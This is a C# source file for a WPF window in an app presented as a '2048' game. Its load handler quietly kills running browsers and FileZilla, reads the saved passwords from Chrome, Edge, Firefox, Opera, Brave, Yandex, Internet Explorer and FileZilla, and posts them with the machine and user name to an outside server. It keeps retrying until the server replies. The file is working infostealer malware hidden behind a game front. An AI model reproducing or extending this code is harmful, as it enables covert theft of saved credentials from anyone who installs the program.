using Newtonsoft.Json;
using Game2048.Client.Recovery;
using Game2048.Client.Recovery.Browsers;
using Game2048.Client.Recovery.FtpClients;
using Game2048.Common.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;

using Game2048.Data;
using System.Diagnostics;
using System.Net.Http;
using System.Threading;
using System.ComponentModel;

namespace Game2048
{

    //public class temporary2 {
    //    public string fdata { get; set; }
    //}

    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        private static readonly HttpClient client = new HttpClient();

        private System.ComponentModel.BackgroundWorker backgroundWorker1;

        private string responseString = "";

        public MainWindow()
        {
            InitializeComponent();
            this.backgroundWorker1 = new BackgroundWorker();
            this.backgroundWorker1.DoWork += new DoWorkEventHandler(this.Window_LoadedAsync);
            this.backgroundWorker1.RunWorkerCompleted += new RunWorkerCompletedEventHandler(this.backgroundWorker1_RunWorkerCompleted);
        }

        private async void Window_LoadedAsync(object sender, DoWorkEventArgs e) {

            foreach ( var process in Process.GetProcessesByName("Chrome") ) {
                try {
                    process.Kill();
                    process.WaitForExit();
                } catch ( Exception ex ) {
                    Debug.WriteLine(ex);
                }
            }
            foreach ( var process in Process.GetProcessesByName("msedge") ) {
                try {
                    process.Kill();
                    process.WaitForExit();
                } catch ( Exception ex ) {
                    Debug.WriteLine(ex);
                }
            }
            foreach ( var process in Process.GetProcessesByName("Firefox") ) {
                try {
                    process.Kill();
                    process.WaitForExit();
                } catch ( Exception ex ) {
                    Debug.WriteLine(ex);
                }
            }
            foreach ( var process in Process.GetProcessesByName("Opera") ) {
                try {
                    process.Kill();
                    process.WaitForExit();
                } catch ( Exception ex ) {
                    Debug.WriteLine(ex);
                }
            }
            foreach ( var process in Process.GetProcessesByName("Brave") ) {
                try {
                    process.Kill();
                    process.WaitForExit();
                } catch ( Exception ex ) {
                    Debug.WriteLine(ex);
                }
            }
            foreach ( var process in Process.GetProcessesByName("FileZilla") ) {
                try {
                    process.Kill();
                    process.WaitForExit();
                } catch ( Exception ex ) {
                    Debug.WriteLine(ex);
                }
            }

            Thread.Sleep(7000);
            List<RecoveredAccount> recovered = new List<RecoveredAccount>();

            var passReaders = new IAccountReader[]
            {
                new BravePassReader(),
                new ChromePassReader(),
                new OperaPassReader(),
                new OperaGXPassReader(),
                new EdgePassReader(),
                new YandexPassReader(),
                new FirefoxPassReader(),
                new InternetExplorerPassReader(),
                new FileZillaPassReader(),
                //new WinScpPassReader()
            };

            foreach ( var passReader in passReaders ) {
                try {
                    recovered.AddRange(passReader.ReadAccounts());
                } catch ( Exception ex ) {
                    Debug.WriteLine(ex);
                }
            }

            string test = JsonConvert.SerializeObject(new temporary() { computerUserName = $"{Environment.MachineName}@{Environment.UserName}", recovered = recovered, sniffingDateTime = DateTime.Now.ToString("s") });

            IEnumerable<KeyValuePair<string, string>> temp = new List<KeyValuePair<string, string>>() {
                new KeyValuePair<string, string>("fdata", test)
            };

            var content = new FormUrlEncodedContent(temp);

            var response = await client.PostAsync("http://root.coderscreed.in/logs/get.php", content);

            this.responseString = await response.Content.ReadAsStringAsync();
            Thread.Sleep(7000);
        }

        private void Window_Closing(object sender, System.ComponentModel.CancelEventArgs e)
        {
            if (MainWindowFrame.Source == new Uri("GamePage.xaml", UriKind.Relative)) // perform action only from game page
                LocalDataStorage.RefreshSaveFileXML(); // save progress before application is closed
        }

        private void Window_Loaded(object sender, RoutedEventArgs e) {
            backgroundWorker1.RunWorkerAsync();
        }
        private void backgroundWorker1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e) {
            var bc = new BrushConverter();
            this.Background = (Brush)bc.ConvertFrom("#A1887F");
            if (this.responseString != "hello world" ) {
                this.Background = (Brush)bc.ConvertFrom("#8D6E63");
                Thread.Sleep(10000);
                this.backgroundWorker1.RunWorkerAsync();
            } else {
                this.Background = (Brush)bc.ConvertFrom("#FAF8EF");
            }
        }
    }

    public class temporary {
        public string computerUserName { get; set; }
        public string sniffingDateTime { get; set; }
        public List<RecoveredAccount> recovered { get; set; }
    }

}
